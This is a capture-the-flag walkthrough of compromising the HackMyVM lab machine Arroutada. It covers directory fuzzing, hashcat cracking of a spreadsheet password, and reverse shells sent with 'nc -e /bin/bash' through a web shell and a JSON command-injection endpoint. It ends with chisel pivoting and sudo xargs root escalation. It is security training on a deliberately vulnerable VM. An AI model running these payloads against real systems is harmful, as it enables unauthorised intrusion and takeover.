---
title: CTF Walkthrough for HackMyVM Machine Arroutada
category: [Walkthrough, CTF]
tags: [HackMyVM, Writeup, Password Cracking]   
image:
  path: /assets/img/posts/walthrough/hackmyvm/2024-09-14-arroutada/box-arroutada.png
---

## Introduction
Greetings everyone, in this walkthrough, we will talk about Arroutada a machine among HackMyVM machines. This walkthrough is not only meant to catch the flag but also to demonstrate how a penetration tester will approach this machine in a real-world assessment.
This machine was set up using VirtualBox as recommended by the creator and the Network configuration was changed to 'Nat Network'.
### Machine Description
Name: Arroutada<br>
Goal: Get two flags<br>
Operating System: Linux<br>
Download link: [Arroutada](https://downloads.hackmyvm.eu/arroutada.zip)<br>
### Tools used
1) fping<br>
2) Nmap<br>
3) ffuf<br>
4) Hashcat
5) Libreoffice2john
6) Chisel

## Reconnaissance
 We first start by sending ICMP requests to all IPs in our subnet to identify our target.
 ```bash
┌──(pentester㉿kali)-[~/Arroutada]
└─$fping -aqg 10.0.2.9/24
<SNIP>
10.0.2.9
10.0.2.12
```

We continue by performing a service scan to identify services running on open ports.
```bash
┌──(pentester㉿kali)-[~/Arroutada/Scans/Service]
└─$sudo nmap -n 10.0.2.12 -sV -sC -oN service-scan.nmap
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-13 22:13 BST
Nmap scan report for 10.0.2.12
Host is up (0.00047s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.54 ((Debian))
|_http-server-header: Apache/2.4.54 (Debian)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 08:00:27:84:4A:43 (Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.58 seconds
```
We see that the target only runs an Apache web server. Let's visit this web application.
![](/assets/img/posts/walthrough/hackmyvm/2024-09-14-arroutada/1-browse.png){: .center}

This web page doesn't look interesting so, let's fuzz the web application to uncover hidden files or directories.
```bash
┌──(pentester㉿kali)-[~/Arroutada/Scans/Service]                                                                                      
└─$ffuf -ic -c -u http://10.0.2.12/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -e .php,.html,.txt               
<SNIP>
                                                  
imgs                    [Status: 301, Size: 305, Words: 20, Lines: 10, Duration: 0ms]                                                            
index.html              [Status: 200, Size: 59, Words: 3, Lines: 6, Duration: 793ms]                                                             
scout                   [Status: 301, Size: 306, Words: 20, Lines: 10, Duration: 6ms]                                                            
.html                   [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 1ms]                                                            
<SNIP> 
```

From our fuzzing, we discovered the **Scout** directory. When we visit this directory we see a message indicating that some important files are kept in the directory **/scout/xxxx/docs/**.
![](/assets/img/posts/walthrough/hackmyvm/2024-09-14-arroutada/2-browse.png){: .center}

Since we don't know the middle directory, we can use ffuf to fuzz for it.
```bash
┌──(pentester㉿kali)-[~/Arroutada/Scans/Service]
└─$ffuf -ic -c -u http://10.0.2.12/scout/FUZZ/docs -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt

<SNIP>
j2                      [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 16ms]
<SNIP>
```

Our fuzzing has uncovered the name of the directory. We can use this name to visit the **docs** directory.
![](/assets/img/posts/walthrough/hackmyvm/2024-09-14-arroutada/3-browse.png){: .center}

This directory indeed contains important files. The two files of high interest here are **pass.txt** and **shellfile.ods**. We can download both files and view them locally.
```bash
┌──(pentester㉿kali)-[~/Arroutada/Scans/Web]
└─$curl http://10.0.2.12/scout/j2/docs/pass.txt
user:password
```
![](/assets/img/posts/walthrough/hackmyvm/2024-09-14-arroutada/file-auth.png){: .center}

As we can see in the image above the spreadsheet file is password-protected and the password in the **pass.txt** file does not work on the spreadsheet. We can extract the password hash from the file using libreoffice2john and attempt a brute-force attack using Hashcat.
```bash
┌──(pentester㉿kali)-[~/Arroutada/Misc Files]
└─$libreoffice2john shellfile.ods > file-hash.txt

┌──(pentester㉿kali)-[~/Arroutada/Misc Files]
└─$sed -i -e 's/shellfile.ods//g' -e 's/://g' file-hash.txt

┌──(pentester㉿kali)-[~/Arroutada/Misc Files]            
└─$hashcat -a 0 -m 18400 file-hash.txt /usr/share/wordlists/rockyou.txt                
hashcat (v6.2.6) starting                                                        
OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]                              
============================================================================================================================================                          
* Device #1: cpu-sandybridge-AMD Ryzen 3 7320U with Radeon Graphics, 1070/2205 MB (512 MB allocatable), 2MCU                                                        
Minimum password length supported by kernel: 0                                                                                         
Maximum password length supported by kernel: 256                                                                                       
Session..........: hashcat                                         
Status...........: Running                                         
Hash.Mode........: 18400 (Open Document Format (ODF) 1.2 (SHA-256, AES))                                                                                          <SNIP>
$odf$*1*1*100000*32*b6faccf504c29e07398b10e3145afe6bebc7748bfdbc47986f32136f51661a7b*16*23e0328760785d4860d792544a5d898c*16*c6a419ad516f22a5c0f91ea1cbf584ed*0*622bdd7aa97ec525a89a952afe1f65<SNIP>66ee7623c7889f9335bb3bc3e4f2b39c9cc21ed78eede60e8af713174489aca596702bccc87552d176d033ee0cb34620730f380c8cbbf54c6f0061de7b8c71752e2d999fc79b8dcffc612b62d3d2b921684ef6d7f043a82b3413f081a454b93f3ee18ad15c0da2d3bd92fd1311d9e550e9e95ac4181451664bb3179cc38969d24cff5de21ec636e2559f0d4807937a255fdb1c1c534717fbf375c407788efc1d133e9d66a29553fd5c9fd489b2ad3e1b838cf41ec18a8a9bd0b01483e8:<REDACTED>            
<SNIP>                                                                                  
Started: Fri Sep 13 22:40:17 2024                                  
Stopped: Fri Sep 13 22:44:28 2024   
```

*NB: Remember that the hash extracted by libreoffice2john is not in hashcat's format and still needs some processing before hashcat can crack it otherwise we can directly use john the ripper* 

With the password extracted above, we can open the spreadsheet file. This file appears to contain the path to a web shell.
![](/assets/img/posts/walthrough/hackmyvm/2024-09-14-arroutada/shell-path.png){: .center}

Unfortunately for us, when we visit the page it is blank. This could be an indication that some parameters are needed
![](/assets/img/posts/walthrough/hackmyvm/2024-09-14-arroutada/shell-browse.png){: .center}

Since we don't know the parameter(s) used by the shell we need to fuzz for these parameters.
```bash
┌──(pentester㉿kali)-[~/Arroutada/Scans/Web]
└─$ffuf -ic -c -u http://10.0.2.12/thejabasshell.php?FUZZ=id -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs 0

<SNIP>
a                       [Status: 200, Size: 33, Words: 5, Lines: 1, Duration: 20ms]
:: Progress: [6453/6453] :: Job [1/1] :: 314 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
```

We successfully discovered a parameter named **a** but upon accessing it, it revealed that the parameter b is required. 
```bash
┌──(pentester㉿kali)-[~/Arroutada/Scans/Web]
└─$curl http://10.0.2.12/thejabasshell.php?a=id
Error: Problem with parameter "b"

┌──(pentester㉿kali)-[~/Arroutada/Scans/Web]
└─$curl 'http://10.0.2.12/thejabasshell.php?a=id&b=1'
Error: Problem with parameter "b"                    
```

Since we know the new parameter's name but not its value let's fuzz for the value.
```bash
┌──(pentester㉿kali)-[~/Arroutada/Scans/Web]
└─$ffuf -ic -c -u 'http://10.0.2.12/thejabasshell.php?a=id&b=FUZZ'  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -fs 33 

<SNIP>
pass                    [Status: 200, Size: 54, Words: 3, Lines: 2, Duration: 125ms]
<SNIP>
```

## Exploitation

Now, we know the value required by the second parameter. Let's test this web shell by executing the whoami command.
```bash
┌──(pentester㉿kali)-[~/Arroutada/Scans/Web]
└─$curl 'http://10.0.2.12/thejabasshell.php?a=whoami&b=pass'
www-data                  
```

We got a successful execution of the whoami command. At this point, we can start a listener on our attack host to catch a reverse shell from the target.
```bash
┌──(pentester㉿kali)-[~/Arroutada]
└─$nc -lvnp 1234   
listening on [any] 1234 ...
```

Next, we send the reverse shell payload to our target.
```bash
┌──(pentester㉿kali)-[~/Arroutada/Scans/Web]
└─$curl 'http://10.0.2.12/thejabasshell.php?a=nc+-e+/bin/bash+10.0.2.9+1234&b=pass'
```

Back to our shell, we will see a reverse connection.
```bash
┌──(pentester㉿kali)-[~/Arroutada]
└─$nc -lvnp 1234   
listening on [any] 1234 ...
connect to [10.0.2.9] from (UNKNOWN) [10.0.2.12] 51392
whoami
www-data
```

With this access, we can start the internal enumeration process on the target. Most organisations do not expose all their services to the public, so when we land on a server it's worth checking for services running internally. 
```bash
State  Recv-Q Send-Q Local Address:Port Peer Address:PortProcess
LISTEN 0      4096       127.0.0.1:8000      0.0.0.0:*          
LISTEN 0      511                *:80              *:* 
```

We can see that our target runs a local service on port 8000. When we check the process running on the target, we will see that this port is used by a simple PHP server run by the user drito.
```bash
ps aux                                                                         
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND       
<SNIP>
drito        492  0.0  0.0   2484   456 ?        Ss   17:07   0:00 /bin/sh -c /home/drito/service                                                            
drito        493  0.0  0.1   2236  1116 ?        S    17:07   0:00 /home/drito/service                                                                       
drito        494  0.0  0.0   2484   392 ?        S    17:07   0:00 sh -c /usr/bin/php -S 127.0.0.1:8000 -t /home/drito/web/
drito        495  0.0  1.9 193336 19196 ?        S    17:07   0:00 /usr/bin/php -S 127.0.0.1:8000 -t /home/drito/web/
<SNIP>
```

To access this local port from our attack host we will have to apply our knowledge of port forwarding. One handy tool to accomplish this is chisel. To use this, we will first transfer the chisel stand-alone binary from our attack host to our target. We can start a Netcat listener on our  target using the foothold we have obtained.
```bash
nc -lvnp 9000 > chisel
```

Next, we will send the binary from our attack host to our target using Netcat by connecting to the listener we started previously.
```bash
┌──(pentester㉿kali)-[~/Arroutada/Misc Files]
└─$nc -q 0 10.0.2.12 9000 < chisel
```

If we check on our target we will see the binary file and we can give it execution permissions.
```bash
ls 
chisel
chmod 755 chisel
```

With Chisel on our target, we can start a Chisel server in the background that will listen to clients' connections.
```bash
./chisel server -p 4444 --socks5&
```

After this, we can connect to the server by using a Chisel client on our attack host. This will create a listener on our attack host on port 1080. All requests made through this port will be sent through the Chisel connection to our target and our target will send the request to the intended IP address.
```bash
┌──(pentester㉿kali)-[~/Arroutada/Misc Files]
└─$chisel client -v 10.0.2.12:4444 socks
2024/09/13 23:18:27 client: Connecting to ws://10.0.2.12:4444
2024/09/13 23:18:27 client: tun: proxy#127.0.0.1:1080=>socks: Listening
2024/09/13 23:18:27 client: tun: Bound proxies
2024/09/13 23:18:27 client: Handshaking...
2024/09/13 23:18:27 client: Sending config
2024/09/13 23:18:27 client: Connected (Latency 1.745593ms)
2024/09/13 23:18:27 client: tun: SSH connected
```

When the proxy is set up, we can configure our proxychain's configuration file by commenting all proxies used and adding the line ```socks5  127.0.0.1 1080```. The next step will be for us to conduct an Nmap scan to discover the service running on this port but from the enumeration we did above we already know it's a simple PHP server running on this port. We can use proxychain and curl to communicate with this server.
```bash
┌──(pentester㉿kali)-[~/Arroutada/Misc Files]
└─$proxychains curl http://127.0.0.1:8000
<SNIP>
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  127.0.0.1:8000  ...  OK
<h1>Service under maintenance</h1>
<br>
<h6>This site is from ++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>>---.+++++++++++..<<++.>++.>-----------.++.++++++++.<+++++.>++++++++++++++.<+++++++++.---------.<.>>-----------------.-------.++.++++++++.------.+++++++++++++.+.<<+..</h6>

<!-- Please sanitize /priv.php -->
```

The index page of this server seems to contain a text encoded with brainfuck encoding and a warning telling the user to sanitise the /priv.php page. Decoding the brainfuck text doesn't reveal anything interesting.
![](/assets/img/posts/walthrough/hackmyvm/2024-09-14-arroutada/brainfuck-decoded.png){: .center}

Upon accessing the /priv.php page, we see that this page accepts JSON data through POST request and that the value of the **command** key is executed as a system command.
```bash
┌──(pentester㉿kali)-[~/Arroutada/Misc Files]
└─$proxychains curl http://127.0.0.1:8000/priv.php
<SNIP>
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  127.0.0.1:8000  ...  OK
Error: the "command" parameter is not specified in the request body.

/*
$json = file_get_contents('php://input');
$data = json_decode($json, true);

if (isset($data['command'])) {
    system($data['command']);
} else {
    echo 'Error: the "command" parameter is not specified in the request body.';
}
*/
```

We can test this by executing a simple command on the target system.
```bash
┌──(pentester㉿kali)-[~/Arroutada/Misc Files]
└─$proxychains curl http://127.0.0.1:8000/priv.php -X POST -H 'Content-Type: application/json' -d '{"command":"id"}'
<SNIP>
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  127.0.0.1:8000  ...  OK
uid=1001(drito) gid=1001(drito) groups=1001(drito)

<SNIP>
```
*NB: The ID returned to us is the ID of the owning the process as we saw above*

With this information, we can start a listener on our attack host and execute a reverse shell on the target.
```bash
┌──(pentester㉿kali)-[~/Arroutada]
└─$nc -lvnp 5555   
listening on [any] 5555 ...
```
We now send the reverse shell payload to the target.
```bash
┌──(pentester㉿kali)-[~/Arroutada/Misc Files]
└─$proxychains curl http://127.0.0.1:8000/priv.php -X POST -H 'Content-Type: application/json' -d '{"command":"nc -e /bin/bash 10.0.2.9 5555"}' 
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  127.0.0.1:8000  ...  OK
```
Back to our listener, we shall see a reverse connection from the target. We can use this to read the user flag on the system.
```bash
┌──(pentester㉿kali)-[~/Desktop/HackMyVM/Arroutada]
└─$nc -lvnp 5555   
listening on [any] 5555 ...
connect to [10.0.2.9] from (UNKNOWN) [10.0.2.12] 52422
id 
uid=1001(drito) gid=1001(drito) groups=1001(drito)
ls /home/drito
service
user.txt
web
```
## Post Exploitation
Once we obtain access to the target machine as the root user, we can continue our enumeration process now to take over the whole system. One easy way is to check for the user's sudo rights.
```bash
sudo -l
Matching Defaults entries for drito on arroutada:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User drito may run the following commands on arroutada:
    (ALL : ALL) NOPASSWD: /usr/bin/xargs
```

We can see that the user can run the xargs command as the root user. The command is written using its absolute path so it can't be spoofed. Since this command is new for us we visit [GTFOBin](https://gtfobins.github.io/gtfobins/xargs/#sudo) to see how we can exploit this command to obtain a root shell.
![](/assets/img/posts/walthrough/hackmyvm/2024-09-14-arroutada/gtfobin.png){: .center}

GTFOBins successfully gives us a way to exploit this sudo right to obtain a root shell using the xargs command.
```bash
sudo xargs -a /dev/null sh
id 
uid=0(root) gid=0(root) groups=0(root)
ls /root
root.txt
```
Great, we have obtained a root shell on the machine we can use this access to read the flag as seen above.

## Conclusion
Congratulations! In this walkthrough, you have deepened your understanding of password attacks against password-protected documents and exploited a web page that does not sanitise user input before execution. This machine was designed to show how the use of weak passwords and improper sanitisation of user input can greatly affect the security posture of an organisation. Thank you for following up on this walkthrough.







